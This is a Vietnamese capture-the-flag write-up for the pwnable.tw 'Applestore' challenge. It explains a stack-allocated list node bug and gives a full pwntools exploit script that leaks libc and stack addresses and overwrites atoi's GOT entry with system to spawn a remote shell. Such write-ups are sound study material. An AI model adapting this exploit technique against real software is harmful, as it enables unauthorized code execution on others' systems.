---
title: '[Pwnable.tw] – Applestore'
slug: applestore
type: writeup
date: 2021-12-27
summary: '[Pwnable.tw] – [Applestore](https://pwnable.tw/challenge/#7)...'
tags: [security, writeup]
---

Chương trình là 1 cửa hàng bán điện thoại iphone.
##### main()
##### menu()
##### handler()
##### list()
Liệt kê các mặt hàng trong chương trình.
##### add()
Thêm 1 sản phẩm vào giỏ hàng. Các sản phẩm trong giỏ hàng được lưu trên heap dưới dạng 1 double linked list, mỗi node có kiểu là struct PRODUCT. Trong đó: PRODUCT.fd là con trỏ trỏ đến node tiếp theo trong list, PRODUCT.bk là con trỏ trỏ đến node phía trước.
Hàm create() được gọi để tạo 1 node mới và đưa vào hàm insert() để chèn node vào cuối danh sách.
##### delete()
Xóa 1 sản phẩm khỏi giỏ hàng bằng cách thay đổi con trỏ .fd và .bk của 2 node phía trước và phía sau nó. Hoàn toàn không có câu lệnh free() nào để giải phóng bộ nhớ cho node. Do đó không thể khai thác lỗi double free và use after free.
##### cart()
Kiểm tra giỏ hàng hiện tại, in ra cho người dùng, trả về tổng số tiền.
##### checkout()
Kiểm tra nếu tổng tiền = 7174 $ thì sẽ tặng thưởng 1 iphone 8 với giá chỉ 1 $. Khi kiểm tra điều kiện total = 7174 thỏa mãn, chương trình tạo 1 node mới để add vào cuối danh sách. Tuy nhiên node này lại không nằm trong heap mà nằm trên stack, do khai báo: PRODUCT product (lẽ ra phải là PRODUCT *product). Vì stack dễ bị thay đổi khi chương trình nhảy đến các hàm khác nên dữ liệu trên node mới này có thể điều khiển được.(iphone8)
### Exploit
```
+ Trước tiên phải làm cho mình được tặng cái iphone 8 thì mới có thể control node trên stack. Ta cần add 20 cái iphone 6 plus (index 2) và 6 cái iphone 6 (index 1) để đạt được điều kiện total = 20*299 + 6*199 = 7174 $.
+ Sau khi bypass checkout()  để tạo node product. Chương trình trở về hàm handler(). Lúc này nếu ta gọi hàm delete(), chương trình sẽ yêu cầu nhập lựa chọn và lưu vào biến choose, đây là lúc ta chèn payload để overwrite node product.
![img](https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_debug_heap.png?raw=true)
+ Trong hàm delete(), sau khi đã delete node, có câu lệnh printf() để in P.name. Ta thay thế địa chỉ của atoi.got để có được atoi_address ta tính được libc_base_address, và từ đó tính ra system_address và binsh_address.
```
(libc_base_address) = (atoi_address) – (offset_of_atoi_in_libc)(system_address) = (libc_base_address) + (offset_of_system_in_libc)
```
+ Chúng ta leak địa chỉ của environ. Vì environ nằm trên stack nên ta tính được địa chỉ ebp của hàm delete() dựa vào offset.
![img](https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_debug_leakstack1.png?raw=true)
![img](https://github.com/datnlq/Source/blob/main/Pwnable/applestore/applestore_debug_leakstack2.png?raw=true)
+ Ta sẽ ghi đè got của hàm atoi() thành hàm system(). Như thế mỗi khi gọi hàm atoi(), chương trình sẽ tra bảng .GOT và lấy địa chỉ của hàm system() ra mà execute.
```
```
from pwn import *
#libc=ELF('/lib/i386-linux-gnu/libc-2.31.so')
libc=ELF('libc_32.so.6')
elf=ELF('./applestore')
def add(x):
    io.sendlineafter('>','2')
    io.sendlineafter('Device Number> ',str(x))
def delete(x):
    io.sendlineafter('>','3')
    io.sendlineafter('Item Number>',x)
def checkout():
    io.sendlineafter('>','5')
    io.sendlineafter('>','y')
def cart(payload):
    io.sendlineafter('>','4')
    io.sendlineafter('>',str(payload))
def exploit():
    # __breakpoint="""
    #     b*0x08048beb
    #     """
    # gdb.attach(io,__breakpoint)
    for i in range(0,6):
        add(1)
    for i in range(0,20):
        add(2)
    checkout()
    payload = b"27" + p32(elf.got['atoi']) + p32(0)*3
    delete(payload)
    io.recvuntil('27:')
    # print(io.recv())
    atoi = u32(io.recvuntil(' ')[:4])
    libc.address = atoi - libc.symbols['atoi']
    payload = b"27" + p32(libc.symbols['environ']) + p32(0)*3
    delete(payload)
    io.recvuntil('27:')
    environ = u32(io.recvuntil(' ')[:4])
    ebp = environ - 0x104
    payload = b"27" + p32(0)*2 + p32(elf.got['atoi'] + 0x22) + p32(ebp-0x8)
    delete(payload)
    payload = p32(libc.symbols['system']) + b';/bin//sh'
    io.sendlineafter('> ',payload)
    io.interactive()
debug = 0
if debug:
    io = process('./applestore')
    context.log_level='DEBUG'
else:
    io = remote('chall.pwnable.tw',10104)
exploit()
```